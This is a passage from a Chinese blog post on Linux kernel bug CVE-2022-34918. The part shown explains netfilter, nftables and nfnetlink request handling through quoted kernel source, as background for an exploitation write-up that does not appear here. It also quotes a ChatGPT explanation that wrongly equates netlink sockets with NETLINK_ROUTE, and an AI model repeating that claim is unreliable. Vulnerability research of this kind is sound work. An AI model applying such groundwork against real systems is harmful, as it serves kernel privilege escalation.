<!doctype html><html><head lang=en><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><title>CVE-2022-34918 - blog of chuj</title><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="这篇文章详述了 netfilter 在 sock 层与用户态沟通的实现以及 nftables 中与 set 相关的几个重要数据结构 `nlattr` `nft_set_ext` `nft_set_ext_tmpl` `nft_set` 的操作。并在此基础上分析了 CVE-2022-34918 漏洞的成因，并使用 USMA 进行利用"><meta property="og:image" content><meta property="og:title" content="CVE-2022-34918"><meta property="og:description" content="这篇文章详述了 netfilter 在 sock 层与用户态沟通的实现以及 nftables 中与 set 相关的几个重要数据结构 `nlattr` `nft_set_ext` `nft_set_ext_tmpl` `nft_set` 的操作。并在此基础上分析了 CVE-2022-34918 漏洞的成因，并使用 USMA 进行利用"><meta property="og:type" content="article"><meta property="og:url" content="https://chujdk.github.io/wp/1663.html"><meta property="article:section" content="posts"><meta property="article:published_time" content="2023-03-09T00:15:00+00:00"><meta property="article:modified_time" content="2023-03-09T00:15:00+00:00"><meta name=twitter:card content="summary"><meta name=twitter:title content="CVE-2022-34918"><meta name=twitter:description content="这篇文章详述了 netfilter 在 sock 层与用户态沟通的实现以及 nftables 中与 set 相关的几个重要数据结构 `nlattr` `nft_set_ext` `nft_set_ext_tmpl` `nft_set` 的操作。并在此基础上分析了 CVE-2022-34918 漏洞的成因，并使用 USMA 进行利用"><script src=https://chujdk.github.io/js/feather.min.js></script>
<link href=https://chujdk.github.io/css/fonts.2c2227b81b1970a03e760aa2e6121cd01f87c88586803cbb282aa224720a765f.css rel=stylesheet><link rel=stylesheet type=text/css media=screen href=https://chujdk.github.io/css/main.ac08a4c9714baa859217f92f051deb58df2938ec352b506df655005dcaf98cc0.css><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/katex.min.css><script defer src=https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/katex.min.js></script>
<script defer src=https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/contrib/auto-render.min.js onload=renderMathInElement(document.body)></script>
<script>document.addEventListener("DOMContentLoaded",function(){renderMathInElement(document.body,{delimiters:[{left:"$$",right:"$$",display:!0},{left:"$",right:"$",display:!1}]})})</script><link rel=stylesheet type=text/css href=https://chujdk.github.io/css/font.e98a2c89163f90d6fa6d8baf5a50a6561f8ff3d0be1551265f364d138d75df33.css></head><body><div class=content><header><div class=main><a href=https://chujdk.github.io/>blog of chuj</a></div><nav><a href=/>Home</a>
<a href=/posts.html>All posts</a>
<a href=/about.html>About</a>
<a href=/tags.html>Tags</a></nav></header><main><article><div class=title><h1 class=title>CVE-2022-34918</h1><div class=meta>Posted on Mar 9, 2023</div></div><section class=body><h2 id=netfilter-iptables-nftables><span class=section-num>1</span> netfilter/iptables/nftables</h2><p>这里简述一下 netfilter 和 iptables 和 nftables 之间的关系，我对网络的了解甚少，所以在看代码的时候三者的关系给了我不少困扰。</p><ul><li><code>netfilter</code> 是内核中的软件框架，用于网络操作。它提供了许多与数据包过滤，网络地址转换（NAT, Network Address Translation）和端口转发相关的操作。</li><li><code>nftables</code> 是内核中的一个子系统，提供了对数据包、帧、报的过滤和分类。旨在取代 <code>netfilter</code> 的 <code>iptables</code> 部分。他的用户态管理工具为 <code>nft</code> 。</li><li><code>iptables</code> 是一个用户态程序，可以让系统管理员来配置 ip 数据包的过滤规则。通过一个 <code>netfilter</code> 模块实现。</li></ul><p>如上可以看出， <code>nft</code> 和 <code>iptables</code> 是同类型工具，用于用户的配置。 <code>nftables</code> 和 <code>iptables</code> 的内核模块同类型，是 <code>nft</code> 和 <code>iptables</code> 这样的工具的“背后的引擎”。他们都是 <code>netfilter</code> 的子系统。而 <code>netfilter</code> 是一个内核的网络软件框架，提供了与网络操作相关的许多接口。</p><h2 id=nfnetlink-in-sock-简单分析><span class=section-num>2</span> nfnetlink in sock 简单分析</h2><p>内核版本 <code>linux v5.11.14</code> 。</p><p>上面提到了 <code>nftables</code> 是 <code>netfilter</code> 的一个子系统，与之类似的还有一些别的子系统，这些子系统都是通过收发 <code>socket</code> 数据包来实现配置的。这些 socket 被称为 <code>(nf)netlink</code> 。</p><p>chatgpt 告诉了我 <code>netlink</code> 的详细定义</p><blockquote><p>当 Linux 内核需要与用户空间进行通信时，通常会使用一种称为 Netlink 的机制。Netlink 提供了一种套接字（socket）编程接口，允许内核与用户空间之间传输消息。在 Linux 系统中，Netlink 主要用于内核与用户空间之间的通信，包括传递系统状态信息、事件通知等。</p><p>Netlink socket 本质上是一种类型为 NETLINK_ROUTE 的套接字。使用 Netlink socket，用户空间可以发送 Netlink 消息到内核，并从内核接收 Netlink 消息。内核使用 Netlink socket 向用户空间发送通知和事件，例如网络接口状态更改、路由更改、IPsec 安全事件等。Netlink 消息的格式比较简单，由 Netlink 头和 Netlink 负载组成。Netlink 头包括了消息的类型、长度、标志等信息，而 Netlink 负载则包含了具体的消息内容。</p><p>在 Linux 内核中，Netlink socket 可以使用函数 netlink_kernel_create() 和 netlink_unicast() 创建和使用。netlink_kernel_create() 用于创建一个内核 Netlink socket，用于向用户空间发送通知和事件。netlink_unicast() 用于将消息发送到指定的 Netlink socket。</p><p>在 nftables 中，Netlink socket 用于与用户空间交互，包括配置规则集、通知用户态事件等。nftables 通过 Netlink socket 向内核发送请求，并通过 Netlink socket 接收内核的响应。nftables 的规则集也是通过 Netlink socket 与内核进行通信的。用户空间的 nftables 工具可以使用 Netlink socket 直接操作内核中的规则集。此外，nftables 还可以向用户空间发送通知和事件，以便用户空间的应用程序获取相关信息。</p><p>总之，Netlink socket 是 Linux 内核与用户空间之间通信的重要机制，nftables 通过 Netlink socket 与用户空间交互，实现了对内核中规则集的操作和事件的通知。</p></blockquote><p>也就是说 netlink 是一种套接字类型，用于和内核中的网络系统沟通。而 <code>nfnetlink</code> 就是专门为了各种 <code>netfilter</code> 的子系统实现的一种套接字（nf 就指代 <b>n</b>et<b>f</b>ilter），向这种套接字发送消息，套接字就会自动把配置数据转发到对应的子系统</p><p>也就是说，对于各种类型的 <code>netfilter</code> 子系统的配置，全部通过 <code>nfnetlink</code> 向这种套接字收发数据包完成。</p><h3 id=初始化><span class=section-num>2.1</span> 初始化</h3><p>对于他的初始化，由 <code>nfnetlink_net_init</code> 实现</p><p><a id="code-snippet--nfnetlink-net-init(struct net *)"></a></p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#007020;font-weight:700>static</span> <span style=color:#902000>int</span> __net_init <span style=color:#06287e>nfnetlink_net_init</span>(<span style=color:#007020;font-weight:700>struct</span> net <span style=color:#666>*</span>net)
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>        <span style=color:#007020;font-weight:700>struct</span> sock <span style=color:#666>*</span>nfnl;
</span></span><span style=display:flex><span>        <span style=color:#007020;font-weight:700>struct</span> netlink_kernel_cfg cfg <span style=color:#666>=</span> {
</span></span><span style=display:flex><span>                .groups	<span style=color:#666>=</span> NFNLGRP_MAX,
</span></span><span style=display:flex><span>                .input	<span style=color:#666>=</span> nfnetlink_rcv,
</span></span><span style=display:flex><span><span style=color:#007020>#ifdef CONFIG_MODULES
</span></span></span><span style=display:flex><span><span style=color:#007020></span>                .bind	<span style=color:#666>=</span> nfnetlink_bind,
</span></span><span style=display:flex><span><span style=color:#007020>#endif
</span></span></span><span style=display:flex><span><span style=color:#007020></span>        };
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        nfnl <span style=color:#666>=</span> <span style=color:#06287e>netlink_kernel_create</span>(net, NETLINK_NETFILTER, <span style=color:#666>&amp;</span>cfg);
</span></span><span style=display:flex><span>        <span style=color:#007020;font-weight:700>if</span> (<span style=color:#666>!</span>nfnl)
</span></span><span style=display:flex><span>                <span style=color:#007020;font-weight:700>return</span> <span style=color:#666>-</span>ENOMEM;
</span></span><span style=display:flex><span>        net<span style=color:#666>-&gt;</span>nfnl_stash <span style=color:#666>=</span> nfnl;
</span></span><span style=display:flex><span>        <span style=color:#06287e>rcu_assign_pointer</span>(net<span style=color:#666>-&gt;</span>nfnl, nfnl);
</span></span><span style=display:flex><span>        <span style=color:#007020;font-weight:700>return</span> <span style=color:#40a070>0</span>;
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>这个函数主要是通过 <code>netlink_kernel_create</code> 函数创建了一个 <code>sock</code> ，并且把这个 <code>sock</code> 提供给了要被初始化的 <code>net</code> 。同时还注册了一组回调函数（即虚表结构体 <code>cfg</code> ）。</p><h3 id=用户态向内核请求流程><span class=section-num>2.2</span> 用户态向内核请求流程</h3><p>当用户需要进行配置规则集等操作时，就需要通过 <code>netlink</code> 向内核态发起请求。由于所有的子系统共用一个 <code>nfnetlink</code> ，所以在传入时要指定子系统的 id 和请求的操作的 id ，在 sock 这一层，主要做的就是根据这两个 id 选出合适的函数进行调用以及提取出数据传入给该函数。</p><p>由于这是一个向 <code>socket</code> 写的过程，所以流程的开始就是一些 general 的 <code>socket</code> 处理函数，根据 netlink 的 <code>socket</code> 类型，最后会通过调用初始化时注册的 <code>netlink_kernel_cfg.input</code> 函数来处理用户的输入。</p><p><a id=code-snippet--nfnetlink-rcv></a></p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#007020;font-weight:700>static</span> <span style=color:#902000>void</span> <span style=color:#06287e>nfnetlink_rcv</span>(<span style=color:#007020;font-weight:700>struct</span> sk_buff <span style=color:#666>*</span>skb)
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>        <span style=color:#007020;font-weight:700>struct</span> nlmsghdr <span style=color:#666>*</span>nlh <span style=color:#666>=</span> <span style=color:#06287e>nlmsg_hdr</span>(skb);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#007020;font-weight:700>if</span> (skb<span style=color:#666>-&gt;</span>len <span style=color:#666>&lt;</span> NLMSG_HDRLEN <span style=color:#666>||</span>
</span></span><span style=display:flex><span>            nlh<span style=color:#666>-&gt;</span>nlmsg_len <span style=color:#666>&lt;</span> NLMSG_HDRLEN <span style=color:#666>||</span>
</span></span><span style=display:flex><span>            skb<span style=color:#666>-&gt;</span>len <span style=color:#666>&lt;</span> nlh<span style=color:#666>-&gt;</span>nlmsg_len)
</span></span><span style=display:flex><span>                <span style=color:#007020;font-weight:700>return</span>;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#007020;font-weight:700>if</span> (<span style=color:#666>!</span><span style=color:#06287e>netlink_net_capable</span>(skb, CAP_NET_ADMIN)) {
</span></span><span style=display:flex><span>                <span style=color:#06287e>netlink_ack</span>(skb, nlh, <span style=color:#666>-</span>EPERM, <span style=color:#007020>NULL</span>);
</span></span><span style=display:flex><span>                <span style=color:#007020;font-weight:700>return</span>;
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#007020;font-weight:700>if</span> (nlh<span style=color:#666>-&gt;</span>nlmsg_type <span style=color:#666>==</span> NFNL_MSG_BATCH_BEGIN)
</span></span><span style=display:flex><span>                <span style=color:#06287e>nfnetlink_rcv_skb_batch</span>(skb, nlh);
</span></span><span style=display:flex><span>        <span style=color:#007020;font-weight:700>else</span>
</span></span><span style=display:flex><span>                <span style=color:#06287e>netlink_rcv_skb</span>(skb, nfnetlink_rcv_msg);
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>这个函数主要是做一些检查，包括数据包的合法性检查和权限检查（操作 <code>nftables</code> 需要 <code>CPA_NET_ADMIN</code> 权限）。接下来根据 <code>nlmsg_type</code> 会调用两个不同的函数来处理。这里我们看 <code>nfnetlink_rcv_skb_batch</code> 函数</p><p><a id=code-snippet--nfnetlink-rcv-skb-batch></a></p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#007020;font-weight:700>static</span> <span style=color:#902000>void</span> <span style=color:#06287e>nfnetlink_rcv_skb_batch</span>(<span style=color:#007020;font-weight:700>struct</span> sk_buff <span style=color:#666>*</span>skb, <span style=color:#007020;font-weight:700>struct</span> nlmsghdr <span style=color:#666>*</span>nlh)
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>        <span style=color:#902000>int</span> min_len <span style=color:#666>=</span> <span style=color:#06287e>nlmsg_total_size</span>(<span style=color:#007020;font-weight:700>sizeof</span>(<span style=color:#007020;font-weight:700>struct</span> nfgenmsg));
</span></span><span style=display:flex><span>        <span style=color:#007020;font-weight:700>struct</span> nlattr <span style=color:#666>*</span>attr <span style=color:#666>=</span> (<span style=color:#902000>void</span> <span style=color:#666>*</span>)nlh <span style=color:#666>+</span> min_len;
</span></span><span style=display:flex><span>        <span style=color:#007020;font-weight:700>struct</span> nlattr <span style=color:#666>*</span>cda[NFNL_BATCH_MAX <span style=color:#666>+</span> <span style=color:#40a070>1</span>];
</span></span><span style=display:flex><span>        <span style=color:#902000>int</span> attrlen <span style=color:#666>=</span> nlh<span style=color:#666>-&gt;</span>nlmsg_len <span style=color:#666>-</span> min_len;
</span></span><span style=display:flex><span>        <span style=color:#007020;font-weight:700>struct</span> nfgenmsg <span style=color:#666>*</span>nfgenmsg;
</span></span><span style=display:flex><span>        <span style=color:#902000>int</span> msglen, err;
</span></span><span style=display:flex><span>        u32 gen_id <span style=color:#666>=</span> <span style=color:#40a070>0</span>;
</span></span><span style=display:flex><span>        u16 res_id;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        msglen <span style=color:#666>=</span> <span style=color:#06287e>NLMSG_ALIGN</span>(nlh<span style=color:#666>-&gt;</span>nlmsg_len);
</span></span><span style=display:flex><span>        <span style=color:#007020;font-weight:700>if</span> (msglen <span style=color:#666>&gt;</span> skb<span style=color:#666>-&gt;</span>len)
</span></span><span style=display:flex><span>                msglen <span style=color:#666>=</span> skb<span style=color:#666>-&gt;</span>len;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#007020;font-weight:700>if</span> (skb<span style=color:#666>-&gt;</span>len <span style=color:#666>&lt;</span> NLMSG_HDRLEN <span style=color:#666>+</span> <span style=color:#007020;font-weight:700>sizeof</span>(<span style=color:#007020;font-weight:700>struct</span> nfgenmsg))
</span></span><span style=display:flex><span>                <span style=color:#007020;font-weight:700>return</span>;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        err <span style=color:#666>=</span> <span style=color:#06287e>nla_parse_deprecated</span>(cda, NFNL_BATCH_MAX, attr, attrlen,
</span></span><span style=display:flex><span>                                   nfnl_batch_policy, <span style=color:#007020>NULL</span>);
</span></span><span style=display:flex><span>        <span style=color:#007020;font-weight:700>if</span> (err <span style=color:#666>&lt;</span> <span style=color:#40a070>0</span>) {
</span></span><span style=display:flex><span>                <span style=color:#06287e>netlink_ack</span>(skb, nlh, err, <span style=color:#007020>NULL</span>);
</span></span><span style=display:flex><span>                <span style=color:#007020;font-weight:700>return</span>;
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>        <span style=color:#007020;font-weight:700>if</span> (cda[NFNL_BATCH_GENID])
</span></span><span style=display:flex><span>                gen_id <span style=color:#666>=</span> <span style=color:#06287e>ntohl</span>(<span style=color:#06287e>nla_get_be32</span>(cda[NFNL_BATCH_GENID]));
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        nfgenmsg <span style=color:#666>=</span> <span style=color:#06287e>nlmsg_data</span>(nlh);
</span></span><span style=display:flex><span>        <span style=color:#06287e>skb_pull</span>(skb, msglen);
</span></span><span style=display:flex><span>        <span style=color:#60a0b0;font-style:italic>/* Work around old nft using host byte order */</span>
</span></span><span style=display:flex><span>        <span style=color:#007020;font-weight:700>if</span> (nfgenmsg<span style=color:#666>-&gt;</span>res_id <span style=color:#666>==</span> NFNL_SUBSYS_NFTABLES)
</span></span><span style=display:flex><span>                res_id <span style=color:#666>=</span> NFNL_SUBSYS_NFTABLES;
</span></span><span style=display:flex><span>        <span style=color:#007020;font-weight:700>else</span>
</span></span><span style=display:flex><span>                res_id <span style=color:#666>=</span> <span style=color:#06287e>ntohs</span>(nfgenmsg<span style=color:#666>-&gt;</span>res_id);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#06287e>nfnetlink_rcv_batch</span>(skb, nlh, res_id, gen_id);
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>这个函数会做一些预处理工作，然后调用 <code>nfnetlink_rcv_batch</code> 这个函数，原型为</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#007020;font-weight:700>static</span> <span style=color:#902000>void</span> <span style=color:#06287e>nfnetlink_rcv_batch</span>(<span style=color:#007020;font-weight:700>struct</span> sk_buff <span style=color:#666>*</span>skb, <span style=color:#007020;font-weight:700>struct</span> nlmsghdr <span style=color:#666>*</span>nlh,
</span></span><span style=display:flex><span>                                u16 subsys_id, u32 genid)
</span></span></code></pre></div><p>这里的 <code>subsys_id</code> 取值为下面的一些宏定义的值</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>/* No enum here, otherwise __stringify() trick of MODULE_ALIAS_NFNL_SUBSYS()
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic> * won&#39;t work anymore */</span>
</span></span><span style=display:flex><span><span style=color:#007020>#define NFNL_SUBSYS_NONE 		0
</span></span></span><span style=display:flex><span><span style=color:#007020>#define NFNL_SUBSYS_CTNETLINK		1
</span></span></span><span style=display:flex><span><span style=color:#007020>#define NFNL_SUBSYS_CTNETLINK_EXP	2
</span></span></span><span style=display:flex><span><span style=color:#007020>#define NFNL_SUBSYS_QUEUE		3
</span></span></span><span style=display:flex><span><span style=color:#007020>#define NFNL_SUBSYS_ULOG		4
</span></span></span><span style=display:flex><span><span style=color:#007020>#define NFNL_SUBSYS_OSF			5
</span></span></span><span style=display:flex><span><span style=color:#007020>#define NFNL_SUBSYS_IPSET		6
</span></span></span><span style=display:flex><span><span style=color:#007020>#define NFNL_SUBSYS_ACCT		7
</span></span></span><span style=display:flex><span><span style=color:#007020>#define NFNL_SUBSYS_CTNETLINK_TIMEOUT	8
</span></span></span><span style=display:flex><span><span style=color:#007020>#define NFNL_SUBSYS_CTHELPER		9
</span></span></span><span style=display:flex><span><span style=color:#007020>#define NFNL_SUBSYS_NFTABLES		10
</span></span></span><span style=display:flex><span><span style=color:#007020>#define NFNL_SUBSYS_NFT_COMPAT		11
</span></span></span><span style=display:flex><span><span style=color:#007020>#define NFNL_SUBSYS_COUNT		12
</span></span></span></code></pre></div><p>对应 <code>nftables</code> 的就是 <code>#define NFNL_SUBSYS_NFTABLES 10</code> 了。</p><p>该函数主要做的是获取用户传入的数据所请求的子系统（即调用时传入的 <code>res_id</code> 所代表的子系统）和对应的操作。同时从 <code>netlink</code> 中取出有效载荷，传递给操作的处理函数。</p><p><a id="code-snippet--nfnetlink-rcv-batch summary"></a></p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#007020;font-weight:700>static</span> <span style=color:#902000>void</span> <span style=color:#06287e>nfnetlink_rcv_batch</span>(<span style=color:#007020;font-weight:700>struct</span> sk_buff <span style=color:#666>*</span>skb, <span style=color:#007020;font-weight:700>struct</span> nlmsghdr <span style=color:#666>*</span>nlh,
</span></span><span style=display:flex><span>                                u16 subsys_id, u32 genid)
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span> <span style=color:#60a0b0;font-style:italic>// ...
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>        <span style=color:#007020;font-weight:700>const</span> <span style=color:#007020;font-weight:700>struct</span> nfnetlink_subsystem <span style=color:#666>*</span>ss; <span style=color:#60a0b0;font-style:italic>// &lt;- 子系统
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>        <span style=color:#007020;font-weight:700>const</span> <span style=color:#007020;font-weight:700>struct</span> nfnl_callback <span style=color:#666>*</span>nc; <span style=color:#60a0b0;font-style:italic>// &lt;- 操作（的回调函数结构体）
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span> <span style=color:#60a0b0;font-style:italic>// ...
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>  <span style=color:#007020;font-weight:700>if</span> (subsys_id <span style=color:#666>&gt;=</span> NFNL_SUBSYS_COUNT) <span style=color:#60a0b0;font-style:italic>// &lt;- 检查 subsys_id 的合法性
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>    <span style=color:#007020;font-weight:700>return</span> <span style=color:#06287e>netlink_ack</span>(skb, nlh, <span style=color:#666>-</span>EINVAL, <span style=color:#007020>NULL</span>);
</span></span><span style=display:flex><span>  <span style=color:#60a0b0;font-style:italic>// ...
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>  ss <span style=color:#666>=</span> <span style=color:#06287e>nfnl_dereference_protected</span>(subsys_id); <span style=color:#60a0b0;font-style:italic>// &lt;- 获取 subsys_id 对于的子系统结构体
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>
</span></span><span style=display:flex><span>  <span style=color:#60a0b0;font-style:italic>// ...
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>  <span style=color:#007020;font-weight:700>while</span> (skb<span style=color:#666>-&gt;</span>len <span style=color:#666>&gt;=</span> <span style=color:#06287e>nlmsg_total_size</span>(<span style=color:#40a070>0</span>)) {
</span></span><span style=display:flex><span>    <span style=color:#60a0b0;font-style:italic>// ...
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>    nc <span style=color:#666>=</span> <span style=color:#06287e>nfnetlink_find_client</span>(type, ss); <span style=color:#60a0b0;font-style:italic>// &lt;- 获取消息的目标对象
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>
</span></span><span style=display:flex><span>    <span style=color:#60a0b0;font-style:italic>// ...
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>    <span style=color:#007020;font-weight:700>if</span> (nc<span style=color:#666>-&gt;</span>call_batch) {
</span></span><span style=display:flex><span>      err <span style=color:#666>=</span> nc<span style=color:#666>-&gt;</span><span style=color:#06287e>call_batch</span>(net, net<span style=color:#666>-&gt;</span>nfnl, skb, nlh, <span style=color:#60a0b0;font-style:italic>// &lt;- 调用其处理函数
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>                           (<span style=color:#007020;font-weight:700>const</span> <span style=color:#007020;font-weight:700>struct</span> nlattr <span style=color:#666>**</span>)cda,
</span></span><span style=display:flex><span>                           <span style=color:#666>&amp;</span>extack);
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>    <span style=color:#60a0b0;font-style:italic>// ...
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>  }
</span></span><span style=display:flex><span>  <span style=color:#60a0b0;font-style:italic>// ...
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>}
</span></span></code></pre></div><h4 id=netfilter-子系统><span class=section-num>2.2.1</span> netfilter 子系统</h4><p>上面说的子系统，如 <code>nftables</code> 子系统，在内核中的表现就是一个模块，而在 <code>nfnetlink</code> 这一层的表现就是一个结构体，这个结构体由模块在 init 的时候注册到 <code>nfnetlink</code> 的一张 <code>table</code> 中，可以使用 <code>subsys_id</code> 寻址。结构体定义如下：</p><p><a id="code-snippet--struct nfnetlink-subsystem"></a></p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#007020;font-weight:700>struct</span> nfnetlink_subsystem {
</span></span><span style=display:flex><span>        <span style=color:#007020;font-weight:700>const</span> <span style=color:#902000>char</span> <span style=color:#666>*</span>name;
</span></span><span style=display:flex><span>        __u8 subsys_id;			<span style=color:#60a0b0;font-style:italic>/* nfnetlink subsystem ID */</span>
</span></span><span style=display:flex><span>        __u8 cb_count;			<span style=color:#60a0b0;font-style:italic>/* number of callbacks */</span>
</span></span><span style=display:flex><span>        <span style=color:#007020;font-weight:700>const</span> <span style=color:#007020;font-weight:700>struct</span> nfnl_callback <span style=color:#666>*</span>cb;	<span style=color:#60a0b0;font-style:italic>/* callback for individual types */</span>
</span></span><span style=display:flex><span>        <span style=color:#007020;font-weight:700>struct</span> module <span style=color:#666>*</span>owner;
</span></span><span style=display:flex><span>        <span style=color:#902000>int</span> (<span style=color:#666>*</span>commit)(<span style=color:#007020;font-weight:700>struct</span> net <span style=color:#666>*</span>net, <span style=color:#007020;font-weight:700>struct</span> sk_buff <span style=color:#666>*</span>skb);
</span></span><span style=display:flex><span>        <span style=color:#902000>int</span> (<span style=color:#666>*</span>abort)(<span style=color:#007020;font-weight:700>struct</span> net <span style=color:#666>*</span>net, <span style=color:#007020;font-weight:700>struct</span> sk_buff <span style=color:#666>*</span>skb,
</span></span><span style=display:flex><span>                     <span style=color:#007020;font-weight:700>enum</span> nfnl_abort_action action);
</span></span><span style=display:flex><span>        <span style=color:#902000>void</span> (<span style=color:#666>*</span>cleanup)(<span style=color:#007020;font-weight:700>struct</span> net <span style=color:#666>*</span>net);
</span></span><span style=display:flex><span>        <span style=color:#902000>bool</span> (<span style=color:#666>*</span>valid_genid)(<span style=color:#007020;font-weight:700>struct</span> net <span style=color:#666>*</span>net, u32 genid);
</span></span><span style=display:flex><span>};
</span></span></code></pre></div><p>每个子系统通过 <code>cb</code> 字段提供对各种操作的回调函数来实现对子系统的模块的调用，注意这个字段指向的是一个数组，数组的每个元素都是一个 <code>nfnl_callback</code> 结构体，定义如下：</p><p><a id="code-snippet--struct nfnl-callback"></a></p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#007020;font-weight:700>struct</span> nfnl_callback {
</span></span><span style=display:flex><span>        <span style=color:#902000>int</span> (<span style=color:#666>*</span>call)(<span style=color:#007020;font-weight:700>struct</span> net <span style=color:#666>*</span>net, <span style=color:#007020;font-weight:700>struct</span> sock <span style=color:#666>*</span>nl, <span style=color:#007020;font-weight:700>struct</span> sk_buff <span style=color:#666>*</span>skb,
</span></span><span style=display:flex><span>                    <span style=color:#007020;font-weight:700>const</span> <span style=color:#007020;font-weight:700>struct</span> nlmsghdr <span style=color:#666>*</span>nlh,
</span></span><span style=display:flex><span>                    <span style=color:#007020;font-weight:700>const</span> <span style=color:#007020;font-weight:700>struct</span> nlattr <span style=color:#666>*</span> <span style=color:#007020;font-weight:700>const</span> cda[],
</span></span><span style=display:flex><span>                    <span style=color:#007020;font-weight:700>struct</span> netlink_ext_ack <span style=color:#666>*</span>extack);
</span></span><span style=display:flex><span>        <span style=color:#902000>int</span> (<span style=color:#666>*</span>call_rcu)(<span style=color:#007020;font-weight:700>struct</span> net <span style=color:#666>*</span>net, <span style=color:#007020;font-weight:700>struct</span> sock <span style=color:#666>*</span>nl, <span style=color:#007020;font-weight:700>struct</span> sk_buff <span style=color:#666>*</span>skb,
</span></span><span style=display:flex><span>                        <span style=color:#007020;font-weight:700>const</span> <span style=color:#007020;font-weight:700>struct</span> nlmsghdr <span style=color:#666>*</span>nlh,
</span></span><span style=display:flex><span>                        <span style=color:#007020;font-weight:700>const</span> <span style=color:#007020;font-weight:700>struct</span> nlattr <span style=color:#666>*</span> <span style=color:#007020;font-weight:700>const</span> cda[],
</span></span><span style=display:flex><span>                        <span style=color:#007020;font-weight:700>struct</span> netlink_ext_ack <span style=color:#666>*</span>extack);
</span></span><span style=display:flex><span>        <span style=color:#902000>int</span> (<span style=color:#666>*</span>call_batch)(<span style=color:#007020;font-weight:700>struct</span> net <span style=color:#666>*</span>net, <span style=color:#007020;font-weight:700>struct</span> sock <span style=color:#666>*</span>nl, <span style=color:#007020;font-weight:700>struct</span> sk_buff <span style=color:#666>*</span>skb,
</span></span><span style=display:flex><span>                          <span style=color:#007020;font-weight:700>const</span> <span style=color:#007020;font-weight:700>struct</span> nlmsghdr <span style=color:#666>*</span>nlh,
</span></span><span style=display:flex><span>                          <span style=color:#007020;font-weight:700>const</span> <span style=color:#007020;font-weight:700>struct</span> nlattr <span style=color:#666>*</span> <span style=color:#007020;font-weight:700>const</span> cda[],
</span></span><span style=display:flex><span>                          <span style=color:#007020;font-weight:700>struct</span> netlink_ext_ack <span style=color:#666>*</span>extack);
</span></span><span style=display:flex><span>        <span style=color:#007020;font-weight:700>const</span> <span style=color:#007020;font-weight:700>struct</span> nla_policy <span style=color:#666>*</span>policy;	<span style=color:#60a0b0;font-style:italic>/* netlink attribute policy */</span>
</span></span><span style=display:flex><span>        <span style=color:#007020;font-weight:700>const</span> <span style=color:#902000>u_int16_t</span> attr_count;		<span style=color:#60a0b0;font-style:italic>/* number of nlattr&#39;s */</span>
</span></span><span style=display:flex><span>};
